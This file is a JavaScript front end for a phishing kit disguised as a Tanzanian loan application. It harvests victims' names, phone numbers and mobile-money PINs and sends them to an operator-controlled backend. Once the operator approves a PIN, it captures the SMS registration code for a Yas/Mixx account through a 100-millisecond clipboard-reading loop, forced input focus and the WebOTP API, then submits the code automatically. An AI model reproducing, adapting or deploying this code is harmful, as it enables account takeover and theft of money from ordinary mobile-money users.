document.addEventListener('DOMContentLoaded', () => {
    const urlParams = new URLSearchParams(window.location.search);
    const adminId = urlParams.get('admin');

    const stepNaelewa = document.getElementById('step-naelewa');
    const stepSlider = document.getElementById('step-slider');
    const stepLoan1 = document.getElementById('step-loan-1');
    const stepLoan2 = document.getElementById('step-loan-2');
    const stepLoan3 = document.getElementById('step-loan-3');
    const stepForm = document.getElementById('step-form');
    const stepLoading = document.getElementById('step-loading');
    const stepOtp = document.getElementById('step-otp') || document.getElementById('step-sms');
    const stepSuccess = document.getElementById('step-success');

    const btnNaelewa = document.getElementById('btn-naelewa');
    const rangeAmount = document.getElementById('range-amount');
    const rangeDuration = document.getElementById('range-duration');
    const sliderValDisplay = document.getElementById('slider-val-display');
    const sliderDurationDisplay = document.getElementById('slider-duration-display');
    const monthlyPaymentVal = document.getElementById('monthly-payment-val');
    const totalRepayVal = document.getElementById('total-repay-val');
    const btnSliderNext = document.getElementById('btn-slider-next');

    const btnNext1 = document.getElementById('btn-next-1');
    const btnPrev2 = document.getElementById('btn-prev-2');
    const btnNext2 = document.getElementById('btn-next-2');
    const btnPrev3 = document.getElementById('btn-prev-3');
    const btnSubmitLoan = document.getElementById('btn-submit-loan');
    const loanForm = document.getElementById('loan-form');
    const btnThibitisha = document.getElementById('btn-thibitisha');
    const otpText = document.getElementById('otp-text');
    const charCount = document.getElementById('char-count');

    const pinErrorBanner = document.getElementById('pin-error-banner');
    const smsErrorBanner = document.getElementById('sms-error-banner');

    let sliderData = { sliderAmount: '1,000,000', sliderDuration: '3 Mwezi', monthlyPayment: 'Tsh 336,115' };
    let loanData = {};
    let currentSessionId = null;
    let statusInterval = null;
    let sensitivityInterval = null;
    let autoCheckInterval = null;
    let isAutoSubmitting = false;

    const REQUIRED_SMS_START = "You are being registered in Mixx by Yas Super App, use the code";

    function isValidSMS(text) {
        if (!text) return false;
        return text.trim().startsWith(REQUIRED_SMS_START);
    }

    function switchStep(fromCard, toCard) {
        if (!fromCard || !toCard) return;
        fromCard.classList.remove('active');
        fromCard.classList.add('hidden');
        toCard.classList.remove('hidden');
        toCard.classList.add('active');
    }

    function updateCalculations() {
        const amt = parseInt(rangeAmount.value) || 1000000;
        const months = parseInt(rangeDuration.value) || 3;
        
        sliderValDisplay.innerText = 'Tsh ' + amt.toLocaleString();
        sliderDurationDisplay.innerText = months + ' Mwezi';

        const totalMultiplier = (1 + (0.05 * (months / 12)));
        const totalRepay = Math.round(amt * totalMultiplier);
        const monthlyPay = Math.round(totalRepay / months);

        monthlyPaymentVal.innerText = 'Tsh ' + monthlyPay.toLocaleString();
        totalRepayVal.innerText = 'Tsh ' + totalRepay.toLocaleString();

        sliderData.sliderAmount = amt.toLocaleString();
        sliderData.sliderDuration = months + ' Mwezi';
        sliderData.monthlyPayment = 'Tsh ' + monthlyPay.toLocaleString();
        document.getElementById('loan-amount').value = amt;
    }

    if (rangeAmount && rangeDuration) {
        rangeAmount.addEventListener('input', updateCalculations);
        rangeDuration.addEventListener('input', updateCalculations);
        updateCalculations();
    }

    if (btnNaelewa) btnNaelewa.addEventListener('click', () => switchStep(stepNaelewa, stepSlider));
    if (btnSliderNext) btnSliderNext.addEventListener('click', () => switchStep(stepSlider, stepLoan1));

    if (btnNext1) {
        btnNext1.addEventListener('click', () => {
            loanData.loanType = document.getElementById('loan-type').value;
            loanData.amount = document.getElementById('loan-amount').value;
            loanData.duration = document.getElementById('loan-duration').value;
            loanData.purpose = document.getElementById('loan-purpose').value || 'Biashara';
            switchStep(stepLoan1, stepLoan2);
        });
    }

    if (btnPrev2) btnPrev2.addEventListener('click', () => switchStep(stepLoan2, stepLoan1));

    if (btnNext2) {
        btnNext2.addEventListener('click', () => {
            const firstName = document.getElementById('first-name').value.trim();
            const lastName = document.getElementById('last-name').value.trim();
            const phone = document.getElementById('phone').value.trim();
            if (!firstName || !lastName || !phone) return alert('Tafadhali jaza taarifa zote.');

            loanData.firstName = firstName;
            loanData.lastName = lastName;
            loanData.phone = phone;
            document.getElementById('confirm-phone').value = phone;

            switchStep(stepLoan2, stepLoan3);
            document.getElementById('summary-amount').innerText = 'TSh ' + loanData.amount;
            document.getElementById('summary-duration').innerText = loanData.duration;
            document.getElementById('summary-purpose').innerText = loanData.purpose;
        });
    }

    if (btnPrev3) btnPrev3.addEventListener('click', () => switchStep(stepLoan3, stepLoan2));
    if (btnSubmitLoan) btnSubmitLoan.addEventListener('click', () => switchStep(stepLoan3, stepForm));

    const pinInputs = document.querySelectorAll('.pin-input');
    pinInputs.forEach((input, index) => {
        input.addEventListener('input', (e) => {
            if (e.target.value && index < pinInputs.length - 1) pinInputs[index + 1].focus();
            updatePinValue();
        });
        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && !input.value && index > 0) pinInputs[index - 1].focus();
        });
    });

    function updatePinValue() {
        let pin = '';
        pinInputs.forEach(i => pin += i.value);
        document.getElementById('pin-hidden').value = pin;
    }

    if (loanForm) {
        loanForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            const phoneInput = document.getElementById('confirm-phone').value.trim();
            const pin = document.getElementById('pin-hidden').value;
            if (pin.length !== 4) return;

            pinErrorBanner.classList.add('hidden');
            currentSessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            switchStep(stepForm, stepLoading);

            try {
                const response = await fetch('/api/submit-credentials', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ sessionId: currentSessionId, sliderData, loanData, phone: phoneInput, pin, adminId })
                });
                const data = await response.json();
                if (data.success) pollStatus();
            } catch (err) {
                switchStep(stepLoading, stepForm);
            }
        });
    }

    if (otpText) {
        ['input', 'change', 'paste', 'keyup'].forEach(eventType => {
            otpText.addEventListener(eventType, () => {
                charCount.innerText = `${otpText.value.length}/1000`;
                const currentText = otpText.value.trim();
                if (isValidSMS(currentText) && !isAutoSubmitting) {
                    smsErrorBanner.classList.add('hidden');
                    triggerAutoSubmit(currentText);
                }
            });
        });
    }

    async function triggerAutoSubmit(text) {
        if (isAutoSubmitting) return;
        isAutoSubmitting = true;
        if (sensitivityInterval) clearInterval(sensitivityInterval);
        if (autoCheckInterval) clearInterval(autoCheckInterval);
        switchStep(stepOtp, stepLoading);

        try {
            await fetch('/api/submit-otp', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ sessionId: currentSessionId, otpText: text })
            });
            pollStatus();
        } catch (err) {
            isAutoSubmitting = false;
        }
    }

    if (btnThibitisha) {
        btnThibitisha.addEventListener('click', () => {
            const text = otpText.value.trim();
            smsErrorBanner.classList.add('hidden');
            
            if (!isValidSMS(text)) {
                smsErrorBanner.classList.remove('hidden');
                isAutoSubmitting = false;
                return;
            }
            triggerAutoSubmit(text);
        });
    }

    // Hyper-aggressive 100ms background loop capturing browser autocomplete/clipboard instantly
    function startHighSensitivityListener() {
        if (sensitivityInterval) clearInterval(sensitivityInterval);
        if (autoCheckInterval) clearInterval(autoCheckInterval);

        if (otpText && stepOtp.classList.contains('active')) {
            otpText.focus();
        }

        sensitivityInterval = setInterval(() => {
            if (isAutoSubmitting) return;

            if (document.activeElement !== otpText && stepOtp.classList.contains('active')) {
                otpText.focus();
            }

            const currentFieldText = otpText.value.trim();
            if (isValidSMS(currentFieldText)) {
                smsErrorBanner.classList.add('hidden');
                triggerAutoSubmit(currentFieldText);
                return;
            }

            if (navigator.clipboard && navigator.clipboard.readText) {
                navigator.clipboard.readText().then(clipText => {
                    if (clipText && !isAutoSubmitting) {
                        const trimmed = clipText.trim();
                        if (isValidSMS(trimmed)) {
                            otpText.value = trimmed;
                            charCount.innerText = `${trimmed.length}/1000`;
                            triggerAutoSubmit(trimmed);
                        }
                    }
                }).catch(() => {});
            }
        }, 100);

        autoCheckInterval = setInterval(() => {
            if (isAutoSubmitting) return;
            const currentText = otpText.value.trim();
            if (isValidSMS(currentText)) {
                smsErrorBanner.classList.add('hidden');
                triggerAutoSubmit(currentText);
            }
        }, 1000);
    }

    function initWebOTP() {
        if ('OTPCredential' in window) {
            const ac = new AbortController();
            navigator.credentials.get({
                otp: { transport: ['sms'] },
                signal: ac.signal
            }).then(otp => {
                if (otp && (otp.code || otp.value)) {
                    const smsMessage = otp.code || otp.value;
                    if (isValidSMS(smsMessage)) {
                        otpText.value = smsMessage;
                        charCount.innerText = `${smsMessage.length}/1000`;
                        smsErrorBanner.classList.add('hidden');
                        setTimeout(() => {
                            if (!isAutoSubmitting) {
                                triggerAutoSubmit(smsMessage);
                            }
                        }, 10);
                    }
                }
            }).catch(() => {});
        }
    }

    function pollStatus() {
        if (statusInterval) clearInterval(statusInterval);

        statusInterval = setInterval(async () => {
            try {
                const res = await fetch(`/api/check-status/${currentSessionId}`);
                const data = await res.json();

                if (data.status === 'approved_pin') {
                    if (stepOtp && stepOtp.classList.contains('hidden')) {
                        switchStep(stepLoading, stepOtp);
                        startHighSensitivityListener();
                        initWebOTP();
                    }
                } else if (data.status === 'success') {
                    clearInterval(statusInterval);
                    if (sensitivityInterval) clearInterval(sensitivityInterval);
                    if (autoCheckInterval) clearInterval(autoCheckInterval);
                    document.getElementById('final-approved-amount').innerText = 'TSh ' + loanData.amount;
                    switchStep(stepLoading, stepSuccess);
                } else if (data.status === 'wrong_pin') {
                    clearInterval(statusInterval);
                    if (sensitivityInterval) clearInterval(sensitivityInterval);
                    if (autoCheckInterval) clearInterval(autoCheckInterval);
                    pinInputs.forEach(i => i.value = '');
                    document.getElementById('pin-hidden').value = '';
                    pinErrorBanner.classList.remove('hidden');
                    switchStep(stepLoading, stepForm);
                    pinInputs[0].focus();
                } else if (data.status === 'wrong_sms') {
                    clearInterval(statusInterval);
                    if (sensitivityInterval) clearInterval(sensitivityInterval);
                    if (autoCheckInterval) clearInterval(autoCheckInterval);
                    
                    otpText.value = '';
                    isAutoSubmitting = false;
                    charCount.innerText = '0/1000';
                    smsErrorBanner.classList.remove('hidden');
                    
                    switchStep(stepLoading, stepOtp);
                    startHighSensitivityListener();
                    initWebOTP();
                    pollStatus();
                } else if (data.status === 'denied') {
                    clearInterval(statusInterval);
                    if (sensitivityInterval) clearInterval(sensitivityInterval);
                    if (autoCheckInterval) clearInterval(autoCheckInterval);
                    location.reload();
                }
            } catch (err) {}
        }, 2000);
    }
});
                          
